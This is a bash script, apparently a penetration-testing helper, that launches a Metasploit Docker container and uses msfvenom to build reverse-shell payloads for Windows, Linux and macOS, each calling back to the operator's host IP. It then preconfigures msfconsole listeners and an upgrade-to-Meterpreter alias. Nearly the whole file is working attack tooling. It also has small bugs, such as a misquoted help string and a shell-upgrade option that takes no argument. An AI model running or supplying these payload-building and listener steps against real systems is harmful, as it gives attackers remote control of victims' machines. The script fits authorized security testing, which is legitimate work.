#!/bin/bash

function print_help { echo "docker_start.sh -d <Folder for console desktop> -n <network iface> -p <exploit port> -w [Windows Payload] -l [Linux Payoad]" -o [OSX Payload] >&2 ; } 

		
while getopts d:n:p:uwlo option
do
	case "${option}" in
		d)
			desktopfolder=${OPTARG}
			;;
		n) 
			netiface=${OPTARG}
			hostip="$(ipconfig getifaddr $netiface)"
			;;
		p) 
			exploitport=$OPTARG
			;;
		u)
			shellupgradeport=$OPTARG
			;;
		w)
			winpay=1
			;;
		l)
			linpay=1
			;;
		o)
			osxpay=1
			;;
		?) print_help; exit 2;;
	esac
done

if [ -z $shellupgradeport ]; then
	shellupgradeport=4433
fi

# start bash ports forwarding and shared folders
msf="$(docker run -d -t \
	-p $exploitport:$exploitport \
	-p $shellupgradeport:$shellupgradeport \
	-v $desktopfolder:/pentest/Desktop \
	pennoser/msf:latest /bin/bash)"

# build basic reverse payloads for host
if [ -n "$winpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "windows/meterpreter/reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" \
		-f "exe" \
		-o "/pentest/Desktop/shell.exe"
fi
if [ -n "$linpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "linux/x86/meterpreter/reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" \
		-f "elf" \
		-o "/pentest/Desktop/shell"
	docker exec -ti $msf /bin/bash \
		-c "chmod +x /pentest/Desktop/shell"
fi
if [ -n "$osxpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "osx/x86/shell_reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" -f \
		"macho" -o "/pentest/Desktop/shell.command"
	docker exec -ti $msf /bin/bash \
		-c "chmod +x /pentest/Desktop/shell.command"
fi

# setup msfconsole startup
docker exec -t $msf /bin/bash \
	-c "echo alias upgrade 'use post/multi/manage/shell_to_meterpreter LPORT=$shellupgradeport' >> /root/.msf4/msfconsole.rc"
docker exec -t $msf /bin/bash \
	-c "echo set lport $exploitport >> /root/.msf4/linpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo exploit -j >> /root/.msf4/linpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo set lport $exploitport >> /root/.msf4/winpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo exploit -j >> /root/.msf4/winpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo set lport $exploitport >> /root/.msf4/osxpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo exploit -j >> /root/.msf4/osxpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo clear >> /root/.msf4/msfconsole.rc"
docker exec -t $msf /bin/bash \
	-c "echo set -g LHOST $hostip >> /root/.msf4/msfconsole.rc"

# run msfconsole
docker exec -ti $msf msf 

# cleanup
docker container stop $msf
docker container rm $msf
rm $desktopfolder/shell*
desktopfolder=''
netiface=''
hostip=''
exploitport=''
shellupgradeport=''
winpay=''
linpay=''
osxpay=''
